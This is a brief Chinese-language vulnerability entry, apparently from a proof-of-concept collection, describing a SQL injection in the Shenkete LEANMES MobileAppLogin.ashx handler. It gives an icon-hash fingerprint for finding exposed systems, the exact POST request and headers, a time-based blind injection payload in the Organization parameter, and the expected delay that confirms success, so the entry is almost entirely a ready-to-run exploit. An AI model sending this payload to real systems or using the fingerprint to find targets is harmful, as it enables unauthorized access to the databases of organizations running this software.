# 深科特LEANMESMobileAppLogin存在SQL注入漏洞

- **系统**：深科特　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="1505132128"`
- **请求**：`POST /Handler/MobileAppLogin.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
Action=checkmesurl&Organization='waitfor delay'0:0:5'--
```
- **预期**：200　|　响应时间>=5s